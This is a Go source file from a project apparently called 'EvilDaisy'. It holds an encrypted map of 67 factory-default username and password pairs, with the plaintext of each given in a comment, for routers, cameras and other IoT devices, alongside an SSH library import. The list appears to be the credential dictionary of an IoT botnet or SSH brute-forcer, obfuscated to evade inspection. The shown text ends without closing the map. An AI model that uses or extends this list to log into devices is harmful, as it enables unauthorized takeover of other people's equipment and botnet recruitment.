package Wordlist

import (
	"fmt"
	"runtime"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"

	"EvilDaisy/Configs"
	"EvilDaisy/Security"
	"EvilDaisy/Utils"
)

// Credentials ...
var Credentials = map[int]string{
	1:  "Hs_uF4SOfNGqp0a1Iuqd4gpeWgxs-QajTPrB1cXU9Bqkh0UkLDZ3MfrDVT7CnBavJoTFREPQhr3c-xqpzWWnc3X4AO4_3UYEfLj3YrBWo-up||UKYo_VRk4j5H4ts83MGwzPmowCWxkceh2hLy1m09SFeT-b2kI2bbReDijAXkWHZq1Fua7MdFb4OF9zpISj5Jwo6U9i0fAM8lg0vgQKEJ2yjylHs=",             //root||xc3511
	2:  "7Sg7LiGPXNjVBsAJDKYDFdO4YMPYEN_4V25xOSqUouDvxNt52iiDgZ5fTOichNeC5gOBUoSNn5XvRYagROH3d1lNc8-fbVkXNT_5g2y-i58j||5pYHPVd6-6oTcji-z6B_yftFl2MPFseOmeAsIp6s0yuvbb7t_z00pShbQCI9mKfK8JcQ3ItBVd0g32puwcDExRW5cadkC0d0uF-9_cXwvgddng==",             //root||vizxv
	3:  "KABLCAYAYnaZ8cfKFJKZT8DpZhwvxJg--f5wem55GBbf1s4I5pGOpDtQPsP1nZlIMK0UQFq2A_kjIk2y182rcH4KiVY_6G40xQp9rZkZTYpa||WDCa9D39JFBSesp1sEPQZpNCqacoAPVYPdVhIkV4PgIK_ijK7V53s8hUhq27_WD4fBeZBosbKb3IpyW_ODTX1NVcqfneQs3H4ZDCViXZ6LnSyQ==",             //root||admin
	4:  "VL4wTEZa7ElRu8TOh62_WfA18CV1z-w41hAdxyyos3GM96cvDDZwN1OSIbEPFVXLIC-yvViSP2qTau9npOjsh1yQxjsUOKGwXVqLBOx8cVu16Q==||3bh_z-0doKHVpZdYaPYrqJ9V9MaakfC4Cu6j4jFT-BFdnk0OJlyexauwWPloLjIL9zvUWbJ8Le2upt5wWdC9MnHwx6rXVUALlN7Q9b7eP9ygag==",         //admin||admin
	5:  "de2LpxLMIiawnTAO2MIA0ffe6QS4YH5ZuIBn0N5MU-tAVDUAAoU46JdrVDRjE4u3Cr6_1XYArqMUqntUOMU3VGtDvwtKxVH7j5_FdxqsBp1V||JlpOxf2_Rz1Z576evpQJTUt587IbV_1nNr9s0U01RDEL4qcj0cJJtAMMXPvsS10oYPujJKLXYY-KnaGirCzRJcgVH2cxhAK_c0vaQelBdd2wtRQ=",             //root||888888
	6:  "GIvW95tNyMG4wmrs43YG9QmXDngEltNDH09rwc1goLobZgYOKHqSjgmNmToIcL1qlXutni93dq3ItSCkBQzcxlq5KTAYsnf5RKmTQGGL9wSj||ELkw6k02Ks1dP36uZORZzmPIehlYND7o4mgT8BQ2GEZq52Sdy7iivWv_mEFMuIuxYXSquPvY62b4qtX2KRBvQ8yhLTgxfh065nG3qyaatq0jvK71",             //root||xmhdipc
	7:  "LycDXnwFWx7qh1oYbxaheLLUlz4OuLDUIXXbo6nsXX7Ujg9jWeXxe3qBny09QKGpzZXe39TOGN3XTUYxhRKe_noKKcstgrcNkG2BJmA9WeHW||dJNkLw8wZiB2_e0ia62aRR4otxC2FMMvB2Pvd8pMitS-AKietH303OMzL0UBTua-1XbWmAuoWAzQdokvTi0wsqb35AXamj0QfrykH-cfvjlusu1e",             //root||default
	8:  "E0sZh0KP7vCHL_aT3DJ8WqtKIv0nhxnsBUxmRTwwUFtvJdh-AFwx-XHM1qQdfVfwbqkvGZz81N-CbGGxzxSwFQAtEnw3dX7PavWRxRWZs62g||gbSeaNHydJkDgwHfknXVA1ZJzXRYsKsxdeR2pbJPI2HKp-7NK65Yw9nSjbwX9VGDFhvenSFPDjQ1i8DxpsJKbLHMiiE0jJ7dCoduaNI2i7HvXR0Q3A==",         //root||juantech
	9:  "6HSGsGxxIQgbk6mssSMtIKgxFR219j76PBDuNgCljc4QQOEHYOEzkW_t28en-Dk04gWak9M14biJe5pEaPALeQM73_O6HYtxFhqiGEcbBZIk||aKxNKv-pCs7g4gQzeCnwVDeKjphk6Y0AjGfXBMiBy5RYN6XZ8I3aScWksJmTgIuQbac1A_g42oBZ2xzeU-idCt6qk7-TEZFLk5HlPaovx79xO6E=",             //root||123456
	10: "zIxhc0uS22f1acuWpZCZF8QmF6YMBOp4a5i87ipsu11vxgrYlIGhyB6d9H3zBkv4TBv-VdNcj81HkDYvJWgn6xNDr8JBMaO-7U0NQGInvV9m||yNhkiu4gFdXhKzND84WE6QNejf-kepBOCPTk44Xqim062jFyQGbSoZGHiVqigokYbGrZvYJhlKYEKdHtF6HrrCL19R8BqENKH0YbCVveDuygEw==",             //root||54321
	11: "puB5FEuARN69czW_S7YRs_OBtI3sHWgRkVzxEhVZjRMiOTYV2dmk9vTuDX_3XbksRaAgBzG3Cb7Yu6ypHhDgLhaeMprDWiGYFP4bZIPUrXT-9TN5||HzCyxnjFXULLb7EwxOKz59118-w5WVfGbdNsnQD5nySPRgbQCHuMUG8ZGv00aDmmjY9w3EwsAHvjX6Lrgq-IeO5RS7J-ByYiGQGQBu1aICmo5zp9",         //support||support
	12: "f5QJfnx6fM4xB_BS5dRT2kfOFH6vk4YwUF6FISrvBpH3xAXGbhvepPB0By_e3ZgNuiOedFqfkRARvB1xCL4wSl6Z2Tn1GQwgPvVgzMnrbmii||",                                                                                                                             //root:
	13: "G92WfGv5yR689cxbfWwwvzVUKYlHBxhfsSOtAbAkBX-lSd4jdRUhFBVXg1WEafuBV3ml7SsWMCpmWwu5Iz3090-X4sPEs0Pk713HH4y_wAsbiw==||a3YnRNCq6HshEhmpLgIPmAYoCADmS0MNmPb0waYt6L8I7FiTjlvrcxAmEbKSO7XfV8WiBeZ3uGURxZzya_5rzI4uZimiQpi5CA_13GcGrPrda_72cA==",     //admin||password
	14: "HiwakHzijDlKJQHm1rKlJLFj2tUyi--HXZlev1VzExxk2WlOp-TQqpOUUaFClSdx6e7eftn8ePWZq4JMLpJEZvomG5mlCwwtYgRwIFWfe3TY||ZQundykyf5Ty7Mk6J2fkXb146gZ9E3p66iMMGfoGfUJDwXQj93l_Gw5O9qS5oNiR7GTinIFtWVu_-i8wGxM9cVKqQ7QWWdU5lyvuVScccaU5",                 //root||root
	15: "DSVvuIS6W7k3an94xg0qsl-AtHo0fJ74xkQ1WcAenUfKOYxk7XsleOdLQg4TyOYRQECQUH3eclWvH8eAPoSptA-lg7j09RD7u3FWY-qrrM5w||caQx1gNcFAgDIj1jof2WEh4RsuCqelofA2ojhy7qm1WRkkfZg3DSHtRT8eZ2T-cpkefCSnBXHEQurfxx31z9YMgzn2P1PLL6U6u_Pkl8dz-jmA==",             //root||12345
	16: "UVKERDMWd4vdyHo45RIoAbfQoNEFdOL6Xxf1FKISH0ouwJHn0l65Tght8hfJNP5tDjogPTzYI4ePrnGy3Q9D_TsBMiqqq5rYjMbYcSxrAE2u||KLb4QLfFp2FfDgyvmIBxHojPduVsWslNrpHIv5OxyYyE3Nlw8g1CW7TrKsldF-UOuZ2q3JzwmNy1F42n0HxlKdLwkdvgf0AA4wAvUcKoGE9g",                 //user||user
	17: "DlA7WSPzKFFEECMmtPKtS3oTaGd32nELXyOn_3mR3Or6m_pPZ-5lkzjWzyC4OjpRvIh6rgelj6N2P2ZB59bHepB1rsQcUArtCNuk-QnrshDRCg==||",                                                                                                                         //admin:
	18: "oAOC5ceNwC60yl2D_vXnT54QpxJ7zfbaVcRyqvU8b9OsMsBkxBpxIWmL5rl0puk-7TKBw7QLDiXWPBTPV4WUNZPkqZEiOdV5rrSZGeesVclw||1M1jqgvf3tOOJUZsxPmQIsHFa5xF112yIOiVPNxGVkf8kgCrMSsB_xZzRy51GrR23sT4MM7fuI6y4Cq-GZ1xZNQFYi-AWcwGQkcMhjNwzg90",                 //root||pass
	19: "UdQeW1KH_1lgLpaQ8s_mroRxQPGrFkEt7kTuu325201x9MHnzEJgIRZPyQ23uD7Oyj5UXv7eEQi2X7gZjausI43TIiMoPOSj7syeLWLnjdzvKA==||Aj3A3ZWame8vPEIxJ9AjVGJloNMEv4K1a5GffwfJynSPt_iJV-Eqg3bBKns3PEb2bD1ZeSeoRYsbt-1xkntb_IsEU8r8eGeUbtDCVmV8n7jUL2-FiUc=",     //admin||admin1234
	20: "lLfyBLVm0xg3U8WRT6fro0_GS4cVoxihyQYUp6Z2MUGWdGohWLcnVH68TkytWt-8puHYVCuWYkemGeNAfrjQ-xxZmdIehfpcBS_JG4zqE3uI||wc8MtXxvQEuQFb0pjcuIqe8yqTXOEZJ8P2-DoBoVcC7NVqte8-wfM8HvfIDi2kh6yGu-B5OAdCdFs1xfB6OTJYyxpEmbMKPbdTti0jDATvZR",                 //root||1111
	21: "HeEEHWqpAKc08Cnv23hBzHvj9uHoB5SJOjSwtYb7rXegR1G_zsF_Kz3TrIBe__Tos0JWQCq_mQhQREOhLEa-i7hdRcNoCtMRAgR9yPhOEJJQgw==||IoIylnYpQWrfeh7XqLtj9qQw3NcWA-N7jBvn3KmYxDKensdTDqWTX6ogYDHOQfl5wOCP-tOJauRDNjUG-xPNE-zq4rl2TB0FXnHh6FPTHLjJsj-Ysg==",     //admin||smcadmin
	22: "hALiQlxzkWd_vKMVpV30QfEbdMiprHa5EgybSouIksCOdhoFF_VHQpnheEg0TMz9J_fe9g-3yKo6RXLY28yoqX1uGjt3ZT6h9TQLPUAEPexGUQ==||OdCjNDJrWNvhORa8ngB-8PdRbsOIa-MBKuNlVq4tGITIDcBBKmGJhe4jBvbBwwJ_UK76AQcmoc4fW19_mB-QEVcQBZZiRHA90w3f5Jcz0QUz",             //admin||1111
	23: "JDbte5jHW2KmWY5UP0DYxQBmZMgo4UmczKp3SA8blCDw15If2V6yATd5XeelkUjSHi40BjlDe8JT1o-JhcmFpx7kOoBNpYi1MgSu71NCwBsc||QRWWWZzLIHqC7xfUDGcviBDbOX0kUAEW74eJG6wSFtwsRCvTd6oALa81I1gGbW89gM1d3CE1qMuUD9p664wO79MdB7WS05Dp6IKjlAhXC3Ispqo=",             //root||666666
	24: "Smok0QGxCMNCnv4Q7X0pKa1zIldffZwNkSRp0GE_Zf09JATx2oy_LTjAzJeNwVu02EpDux73qf-lpFb_RN2PfL-IdUycFf7rB4g--NXMWToU||DXkt4ZXgzCeEe_7smSU3sLU6NsncjoIMUUrLCLeXWHIKWv3nlYauZmXvH2JmzIAVuMms1T6yqvjeKJMgynSF6eTJ1K-RdjAtwlKimAiRgDXIecGR6w==",         //root||password
	25: "RSMXIn3GalsD-QJ2yI_IkB9ia-3E2HRTqjaOcZe0vKe7uQ2msPxzaMCMoG-2tQeBobbAS0CnGJenfJU-RWF1QCcEM3ajvWiXiAbuiDmBtDdL||tg-Svo5L5Hg969U0L46O3VlGRs9p3eYLDlv11O1-VGBvvMj-0KHlqYPkozw7TxoJPf72T50Oi73WqiK4eH2xhO7_UQ1JiiQr0dJ8ksSaa8zO",                 //root||1234
	26: "zXFiZquJWoK_Q-4RdnmbdTTEjafvO22xeOH_9xLwApZstQAYjTc2AveBLOlmax1roKOGmVzC-qGHyN7FLVcwHUFqRjR6VyHxcLcY_DZdUabq||8ZaokCbBsjUh5Gg1MkPvK6Fwu8Id8c45PAaMySfqWwjSHgUHw3MShzNoh-rPqKm-FsUXt2n6QG9p5TmS-pMwRQuKqqh9tzxdgdNpAS1rsn9qtZ4=",             //root||klv123
	27: "FEnUlcZhiCzwECtXRBTZxss9ptViRfedL9sH3SLJhF9VorglBX0_mOt0qLxMt6XFnybBpslzC4pcfpdTTsEVXfzrcVGl6NBykmrgDKm-ODl44Gbjf7MTqj_c||TZuffTqOeTlFOVVh3xd9syF4bep5AteYzq3WlYtWQ-dhIyOtavYsrHWYytkuBiVQs-fdVhFEQmYY3PJhrZLRLVsD2r1JGoJG4BmuIglrhPvDSw==", //Administrator||admin
	28: "gAHHMs-V7ISyIvGq9CbuLcOg2SdlvUGupaut-VEICG6Vk62lv_fEGrphts98hieP9YVJD6lPIWBYkUtvnusyZQe_BdveehDairsoI-owzRb4N9se||kLCNFysAj3YQ5TJf8KAfgzvwxGf6Mn4G5WZjmgTwmk9LdJ0HFa3FUV5H-Ibcl95rhsi5czKs8aaLx-saKBf6C3P5fCESQQwWIBdD7vwGmD0t4n73",         //service||service
	29: "6OUqTRMaiJZFN8OW6UQeXZd5SiwqWrtuI1ukxrmsZQfIsakpp0VaPuPrx5ByxLv8WK7deYHJw4faUAjy39Sir6ddbTDHMd0kjX3uEGCCaEXpZ-WV9P12||jXhcTSYKfq7iTZNzoexrDotFz4H0AL9LmdaiStPlvM5pUz5J9QbZT9avUBVTmdNC5uzFuu2ytl35IMUOw9Rbpea4sAO7ddvoWVZEGQrQO6DwPn0H49iC", //supervisor||supervisor
	30: "2x3YH9rx9dKFVtGgaBRA5OIUaBHeCCCBln4G35hed8oFTT2UNL7TAHX_iAi3_SIFb7aUqkxZ-CBFWZjfJv6S2gkWaN8x3cOnzc83ReRPWFzKnA==||hC_aCYLLUsrFIr9oB_96iwBaPdsgNzbMPNv3kJ1M_Gc9VlIV88sP-k-NqddCG59MPFrtFzCmiQdMmBR6QaZi5bWe05ve4C460gs3uiziQwUIqw==",         //guest||guest
	31: "dsAKcKMsH03qgTk5iU-fX-K70fLEozHvgzUwu_4K_cywgWcn6WxWLbEzjP78IfNqVBegCalr6cEAmQbkypdYdBXVhvBB65wGzUuuv7mEW-jY-g==||oCn_vBouiiXiOtaE17Tqms-yIuvZom1v_oUkX1NT5YalRhxLl1m_yJcHePT44m4LBCwTQ6bVvgbnW_v6VSLUf_ux3vjnHUtV67Fdq4EyUL3vDg==",         //guest||12345
	32: "RXcmf_c4oH7Tv2_dlNt9HCt3v2vH-IqqQbTKB95ZnGhtUhQ13bgkmbDwLFN4OAftyU7L9DFFPl3kvLqvSWhY6hnPZcJ21TS6zQrws3NuSUYHKg==||Y7oCNP-Cgzbey46TKh4BTsxVSp7uN-fUEq0XTP3dzggyevHxvA84Vy9k15ObVRIP1K3sIfPe2DJDlvpWN-6BZfyDhKBpP82KtVJZ7ZmkXRejIQ==",         //guest||12345
	33: "hKIB61C8A7EBSphPSfy0bxfrDxMMjf9sUVKO4hwY-Jhpox4Qc1QK8hvRVFLG0UPa15rWvFByMoXf2v3lgTPkJyhCyfIOMXkhM4zkmV2dt_UWqPU=||K2MDJRrM0fkNEMX22HcIDryR0pcowZuttFhy43GFxi8LLxjwZwm6x3qnm4qmbuwgTMkCEzQaytaz2Ho9ER7fSJlZT1TiPmNz6jYzOWCSqYUy4VKwnw==",     //admin1||password
	34: "Tkt2IP1mHF97uVV7kizAORdyuGSVQx40Sn5jLi_rvs5EKCjUM5hXO_tDW_faPM-TDmndgo7YejglYWXdNkmxK-JM-92iPG2Gx9bEBJibkQlplpL5mW-Uf6VF||aD0Lf7qxf3Fy7tXqLGxhTrRxZGhShEETdgPWg-G4OEoAtp3Qe2TqKBCHdNrWm4X772PQKkOOcrc3l3SPOL1O8BBqR-_WG-gK9GJYNL9j7vSp",     //administrator||1234
	35: "KEPkJP_9kY7PDfYTCzYANLt3wT7zQ7PK6noYb3HSpxz-cBhGKq-R-52dTq3qVUf8pgsFZiw_048zKWadvyKrtAtCStjchPVpc8Al_tJQXXhfH24=||aJJwXHvGziFFo4chElSEklg0ZTeCU6ZwE3bzVUcBIR-cmhfBhc7CMv2O3UTToTbmrT_kxDPMX-Nr90VIMY-t-PtYPF4o9x0dnFaX6eyfY_OkGRs=",         //666666||666666
	36: "a2yysly5fqvoFWIWzZJhi56RSI4n38WK1AotEQLxR2q5EI37dhM_-zv30lgZZj2jdnScXa3LHW0pF4ZWGsyOiorKgvXIexkHrXIgG4FVEmUFNws=||7vCNmt2mcd1zhgg2cDr16_BiB2R7WSr7zYj6zE6mrL-5Lxins9ZwzhUn7mTnYxR-xyF7P9wP-rGXsZRmlDGeFKaOIBeeD18GCnkqbsmDC6lgKdc=",         //888888||888888
	37: "o7xx_hbC33ULs-CAzEMIFZssw5HBKQ9FHwaI0L_eaWsreXrjNUkBg_4TyILU3om2O2EiYwJ3yBHNvNjhENQSEyBz3Tcsq2cfZAiEZ2zuu877||W7-3coyJTTHfpedLSjkqppxT0TNqWfgFr3KxR19-lzgQOo2C5LzfxkIg3pOBEVf6BSMGA5j3vQfwVmfsCKw5DgfsZLVHU4vMEE1BALWA06VA",                 //ubnt||ubnt
	38: "g4p0sJRcZH_UdV_IlNE6qBZYOsXfHxkRm3F3phZGKddOdr059_HeK0uJ6OBIdzQ41Gfsj5ulT2i2M-IWxWnLV88yf3__Ty4xGopAcI5jPMBb||jmWE8K6BVnIdN9A33_ODrCOSJUpNtnmEeRTqHX1lQ81NRdeFRUYV9_yiBgMmA6kSs--3LEWZ3L_T8J7BnWcP-PQjje8h70M2poLZHPjXufbY3DsJ",             //root||klv1234
	39: "7q74iR7TyAhyzzQJV3tjSKn31QZ5OBQ2wxPV7m9ig173EWc-VnmxY_xnDSL8RsKVNLx-Pna8gl8z4nr7XBQ-k8M0iJ3gN6LRlo-M-N804Wdy||xx3MhsC5RoRl-_1Wxy5vEUllbgc5MRXjWf4t_00q5h2oc6mbB80Yt_MaW3NrIR1bkuc-5kaIyZ60fXXy648UB0DAk2UQK6aO7eCdaTjF7LSNMxs=",             //root||Zte521
	40: "xVEsYi841zo6P4Yzr_GSG9PvakovRZbPcFRKzzu6wHFmAuggAc2wx3R8mvHsc2x6qpMJF5_MJrgNDEfrNwWdFs19Lcy0pNS8gr6yFhzps4bO||qtE81-OtefABMh019-G8SG7bkvL-Vg-Ixu0IEnYTH5KBsCMtiwcaHOHY6N633rrG4g6ABU0o1TeZ29H0MoXRu4X46qV9wtyi4TLeXkC9JHwLyqY=",             //root||hi3518
	41: "zoszfgLzg3QCC9IY7di7ku36LE7ccKWVFz0aRfDz3wAtQxnmkeDyLKrYFM6zdAvlZglEtyvXLHS8xX7hwI0dYM_6Q2WkxNQkxP1Pc4ES4SB5||tVmGXEcmgHq2wYayoJH2cWFSbiP5TFDBmgZDJs1VabvxbHtSWaBuKSYEzyBM5KOb68teX5MP51NrUzl5f3pobSVYyT_OHbbqbH3W-cHiQSxT_Q==",             //root||jvbzd
	42: "0Uu6vqNkw4fEV4Ymnv0_NKm2KvtSz7Xn-I9VbWnaoQk3wJGkeEyLR5xJydigsItDiCEC9S7yL5XTrVF7EGoimHrBflGKGL4o6hZh0iNV8l4X||9MbcTV180zhUrOAxedGpxajuIP7JcANEEBQJeMJhGZgt17xqBf8BEyMyIwG5cgAj43-MYq1W1XVs15mHgZ2Q1doUtlFQFYSdLqLhQRn4JTCs",                 //root||anko
	43: "b9xYwHsBaQ3KJUoaPc5RG2A5GaI4_96Ebj9k7wSQ-w5ev63F-c8QvNhKdJ-lUxjbDDzXn8629mxet3GCrJP2SI-jdoli60_TDvsfriDeWdEI||9RSsMBX0XXtYvQqYZQX1vL3SCKLVdu-JecO4ogv_zLmSl6IfeJCCRYj5E2E0jU4ln4EeOG-kKUKUjlrTJHOzwdkzMozHHtYvdLwLFxXalXccpg==",             //root||zlxx.
	44: "3eHUwmzOdiGyOlSW6JTvQi-J_aRY6i1JNIYoxsMX1TtbDnaMbz_7LBJADhqMJksHk-ofm6oZ4lS1mMwRMsmPKud2aUIhUEXJu1sw9UwUq3Q_||r-S3zjfTonEHBsNAwTOzPDkZxl9V0zXTaPpFd4kpEDZK2CN6HCPFunZfsucXllHKajg21qqz_423NmFG7MpUmtpCVS6PsK5Ycdh7N6Ke0rEbzqpnf1PC2G4=",     //root||7ujMko0vizxv
	45: "dqD838rI70Cc5xwdTgx7JZb9BMCKvYnUaWRXRQo2nutEyiMtP-5PMegx6Ax_ZrAptweof9sgQNaEUCIsQVXM9U7Wm-6ezIB28mREx5X8wXy5||wo4kijWEUH9CPK9a1pBinlUhHVsJlo6nvMK_av25E8QhfEctP4I9teWWqOd0gQ5o4zP0jZ3YVhSMD3n9W-LgAuME5gXi_xs7HGCyM0BcBXzStNgSaTrMTWk=",     //root||7ujMko0admin
	46: "lO8oPjfsvbY4uAtuDNdkhpsagRnmBm6vxIarYHvFgdvOXuTkjZV_enExtlJxuU4ChhtP7ALxARvl-hgfn3Bge-OsR_9T1DjudBt2AnsobWZk||1NwUvbJl_hmW2ycXINGTib9Xy_a2dG2nEbOxG6qNqaHeZkBHHNR02sOjFjLoZXLpNFkNFmz1ASD4EVxNMFdA6jowWm3s0IOIBceMEYFAKtSm_A4=",             //root||system
	47: "5lMp2r8dfpNNFeRja-TT-HdFHU1tXHWsZa32wm1kludaT1riy_I8wHCRX4Kb6MUZMZ5slu4vrF9d-7bY2OjhVbJHymW0I_nbjTx3dUFXN4ou||miWrod6NL55STQKDVrD8ifIuQc2zQmvdnBeMiOr7jPT3A9KsYINQrG4702eafHKBAOpDUyDvjMoXN8K_wmDk_xZTuBcvAS7QkycxP3KXBkuO",                 //root||ikwb
	48: "qeKy-j6ouIGfE_lXLGFMkTSLYAOeTeZSHHA93xD8LzJ8uxfpe7F3RJS-v6sHQzqCgwqlINSaNpHMuYMqctKmQyaK2_ts4uBez8LipekahwLd||_EDOqWu1-Cfl_BL-BlbkpLZTBx9dnosaKSCSxK2gort4igg6cqAcIfyRoO5jNV3IUXpWHmD9KkQ2WYAtiaLQzk7ev59fm4OlGxljuW_2XvZWYv0Kbg==",         //root||dreambox
	49: "Z8774UlPamTLiGZsPzdD1_PXKdRW-GriR15zrnErhOkytsMeI1PXK0-PSqXz_oqR9sVnkj7Nm24QpKuS1CQQrkdrlZIqFd2Fk1-21lGorp2z||b1f7BQzo1WineJOm40P8bg5sv8713eHisF1gIzC7IaCckvRHFPN186r-RrYJkRz3mtvyoEdmmuoA2Ryq9UZledYOEHrOtMwkAd3SvJV9M-1y",                 //root||user
	50: "n-_dxExh19u050yDX1wYVioVlJFKdUccP7cfpvUtgV34ybuIYC_QZgE6bGPtaKV_3yyUVS5qDAT5F7hdyefpBRXvm5MBexKQKr607V_2wfYD||PapFFLwZ6H3xXkGez4yjjJngGaRvTJZ2WJuh0v6FckIKPEPYzONCK1ne6GqNV8NeBiWU5wYNX-jYyfG0XxJSh7UP57Oyr2OzXj5YN6_auPF1lcoM",             //root||realtek
	51: "ZlU7ZW1xsf3ifFyBCcmZZ3i4MQ64hM6JIjAeV0dn09YFy0oRognq8lfyqGMxV_OVZ5KWDOf0ZUmppDluprgpb2TPeJGTE4mg-7Fp3qzf_Dp8||3Tej0_SkjsrQYUkk-C-M_tn9DJOA71PkUN4tyy4fgEaYr7mHXp1f5KOoAdIwT2EXZjMhKpqfMDmQttaCAWecls2vtq1am_z00JssV3mqo9mfmnx-xg==",         //root||00000000
	52: "L59_6fDXOaxMnilX5Ijz6id0BSEVW8ebF3vHim-NqAb2TIzi7Am2p9rGM77RTBTu5fpWhUU7rUShL2m0DFZrreQV_YGRkX26LXu_YJpjuFmktw==||5T0iBoMJQzNvUZlMrsiT3Zuvo43zaGUc0bL0GgvL8K59q8zEzJ4kvOHgAMV-TJeahCUFWglAxyTt6AhgwlNwPealdopfFxbBhZt0ssrca1pN81xV",         //admin||1111111
	53: "gmZVabf_lD4ViRJYkgU10jbuOHL8ios7JYBSmzcK9cTBfJX9nyznakDNb0M6Gl9zoUKawrP95AEHdeSEaUysXP7yP7O6N_LxMGnauBMECwI4rQ==||1XCXXcimOn9cd_P1seV_YR6XIqiRxe_-3DJ_ufLqUtzWUiL1syRW3Bi1vjxBSa59Kvn4IRmF2M_6-6LZeKpU6_N6Way7PIHAyMJHPp2I-S6k",             //admin||1234
	54: "ARyhwSZ6B8LKQ3uH1QYEMQIzx_bcVK9viipudxn1GZUaaWWPbNYrYys7yz6b3DQKeqMw4OId6R1-eq8rBEWSN7OqIBdNeRCXo-rELrFxDdhvNg==||d5LddwEq8JnVtNOptWaIVSJOgTcKfTNyfWSz1kEAIdp2fopNKr8fH_gQumCH-8lvDbdvHZecQUj18bfVewvEh3fMCaAL-ZnT7LXDuMpsJLWKVA==",         //admin||12345
	55: "p1aZotWL2GxpqbshD_k2q-I8E6wZmim_iRMTic-PRL_LFfleYiNeKeaSAc531wRrHPpMNWgazVsvbCVLTMxeffZmRJl2vwP67zgyDeWmUEKviw==||mKs1VmStGb6-U09l69kChT_bGBMTfX7TYx0GLNbCnqkQ6U1MMN2HqKkVk91mfd0GjC_OEne-j0tHnQY-_TnF3O5XB9qVvYHtsrEJJLhahM-Omg==",         //admin||54321
	56: "U9wTfsrdKWfLF2BqDhDK0e4gseID8dGc1MLerwrmryj5AscsXFfu0XZg2JEhIN5KK0hQPsW6s67XevX6J-v1TkjV-ErWOfPKsByX7dkWODxMMg==||LpUvaP2LxOV4jG7iYHoTm5GnAhkmBUU6DieJSk2XDEHlzZknUfktHeW9sXgI8N0bC_H_YjngNGoWs8d-USvR3KQTXKsVs_akMbcSNZDn4ENTdJY=",         //admin||123456
	57: "IOl2p6uEx9wey1vhCuebtBODeVB8HQI9JLDbinPe-n15OnlNsjZOFVCn8deF2NMxn_cVqiehrijraJODjtX60sTDNz10yMwtMbHM556ZTBxc9A==||fJA9L3AQ9LmDJJ1_JsMTvRPg-r6G64kOQEI_xvHlhQ-4BVlkfUttypBV8PpsYjJe3ZAgi3ffKC3w5VfCLrdYnBIrA4Pol9WOA_himnnurs3Y9EZNQWysHLs=", //admin||7ujMko0admin
	58: "ZbmBPx-dAIpLhA3sdmtW_BRfpqvZcTlgx07SLaqSTQ0dUs0cAH7pkB7hCSggrLjXrcyetkSKjh3a62AhORcQcgKKNEWUxtFw94Cxi_QaWExorQ==||AxpVzYnqk3vZQBUl-eXjHdn8-o-RgUqfizP8ATiowXrHicbtmcUD6UuK5XmGVDcwqp6s3oLu1UzUEkhGD9Hbccg3es8CLTzLJYyynoB1S2sz",             //admin||1234
	59: "_r6q4b297wTACTwisZmWCyLXsto-xl7WJTfbtPk3qfJvbQGxkDtCydBV0kt5eQ6sTlF-rVYhOjg5VAh2I-CBowWW-2qspq_VUpczYadQujBxCQ==||iyP7beCr20hjUX7HDHfedPwmY5lBhoCihKkBSn7Retw1vwRjiZaRcGR6Ea4KbU-DW_Q9pqfy98T0WNGTUZk0SFRN6cfb8EzcD56Gqpgj11Nc",             //admin||pass
	60: "kFtd3NmzLRMEOUfhbk7dPVng9l7SUraXNKfR7vXgfqDFW_-31F_S2kuOwfZPOZCRv6N4xv6Px4eRM-lA3DvLyaoqS4Oy0SXJUsT-i4xMtBOTKg==||3WYC3JDcNKZCJZ4ZxHNcbX0ml7SmecFUSrjXdg75qLvnUonFdMuOAOJSp8h8PSJnR_1q6qEJC8VknOsP64LBUykXE1LD6oD-MpxhfOFC9m0vVc8=",         //admin||meinsm
	61: "c-JHmzlACNXTehzgM0EQqTZU68qHN5RoUs-rhh_MpL_ylZWNFJiwKWQtzrAFgDTAjbRi_1f_L8vhxy3jtDqHkwxGAkktVsA3yxoNVPrceR0w||wAlWdO1ITI0-pi9OmvfILWm2eI2D2UfA86ZWJFrxwNaNe23ZK_xpm1SjWWCOnZCfemMJ0eu4Fkc0W0_9WHOZaL-QspfD4UN8KFkOs9gYetYj",                 //tech||tech
	62: "4VMadUs8WOebLnXEYp4Tcs_6Q67QSFJKNwoO5XH27R_qVy3GIbCIYDDnPPiQRkYxitGktJTIZIznHMI0noameanulQX66OGoaraq0o6rHZ5g0w==||gAvuyJ9qnV8vhO5cp1mUKKsZIHWRy1-xQJM95i3mDFzQbdVr9tkl6IltUUroISxl1lPv0qrWdyOZZQXglXlBY2hpM4iIvz7ubDt5lnSUKVEhyQ14XLcX9A==", //admin||turktelekom
	63: "13HQhYFgeJ0F2KXjqvaXwrREhxMbqtXN0sjg2xwmGeYkwFLStS4_-sxBTdP7aHikTfLxk1myLd7IXRBmxQTfPEhyWt2IEXFNgI-cNQRsE4WPCg==||1XgR_OKqInGN0H1uGnbt0H9eo5bZOoqyGMsRKIAt_wnQ5584wsoPUmVLjJLQuW6O1sFxF6vBD3RGbgUcFaqufOKZ8c1jNBBnlxWuW_4cP67Oag==",         //admin||ttnet
	64: "2vkW2mNuYmN0nv74LyfvP5irBKoAbM-W16BjqU4a2bPhojEsr9ym6KXqoZxD-j2C54_GVXXIXGhC3DA08AiT8zD3gkrlBSnHL5otEIMW-guBuA==||jk4C9zTnecO_QV98ejNYno8xylIiH-rU383UvbBe5I09iMHOLx_qEtKRjHjbFHQ9ZJ5UAug0Y4X2GDdFC06Y_LNBFDlgx10ofXXRqgN7FCgVAdc=",         //admin||123456
	65: "IRtLI4gQRDtNXGg-HKMzStoxla9W7ZQRlIEGhoubvJVbS1dj6qADz188rRtR7QSDTbgpUBNV56j30NgtW61QZow4P7r37nL3O0Mxg3sfeiwiAQ==||hh1rFZqdHeKVMxPJp4njf790VQqA-QYiwY_wOFnM-BIJsfl7VS4HZTSuDDExO_pVpqt_Rh5XGoQzB4ksFkb8iWin0ljecLG7wFc1XIecdhd7QG0=",         //Admin||123456
	66: "a4CkO9TcPwPXaRY20Nv8gS5jL0L_2ZKgf50ruJdo5weKMgTOx_c3R72GfuwK2992UFLn7MPT23eNggEycspEmW5Na4TRvu0KBcEUPAQW3QaK8w==||QY5bCRy6h-OvR4nkExcY994MZ0cufHsPH929HKkvS7PlxIEvR_b3ilV_RFVX2wbV0MMB2Q1V4GtgfIJ4sUkwilOLdr0951gb4Q8XBhkEzmFO",             //admin||9999
	67: "lDh2DCdUqxmC5ktPFG74l1t8L0ce72DgrTND1YyWWABmibK54devaY0QkKvzOlCJxXWpaUK3F59KvLZu2Y2cGxK_RMQSrljInx76HFX3cTQjbA==||nPvcfFnpRqhvi596eHLfdMVhB98YqpgJFOLznTSJVNR07a4Oz3WQST01-AmLUxrVprNLgqzbopXeNtAEKzdrB1isfPIxiNnbSp-ZLVY1cps=",             //admin||jvc
